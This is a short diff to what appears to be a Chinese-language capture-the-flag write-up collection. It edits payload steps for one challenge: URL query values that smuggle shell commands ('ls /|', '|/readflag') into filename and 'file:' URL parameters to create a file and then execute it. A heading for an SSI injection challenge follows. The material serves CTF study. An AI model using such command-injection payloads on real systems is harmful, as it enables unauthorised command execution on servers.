@@ -2889,11 +2889,13 @@ payload:
 
     1. 先创建文件
         ```url
+        ?url=&filename=ls /|
         ?url=&filename=|/readflag
         ```
     2. 执行命令
         ```url
-        ?url=file:|readflag&filename=a
+        ?url=file:ls /|&filename=a
+        ?url=file:|/readflag&filename=a
         ```
 
 ## [BJDCTF2020] EasySearch (SSI-Server-Side Includes Injection（服务端包含注入）)
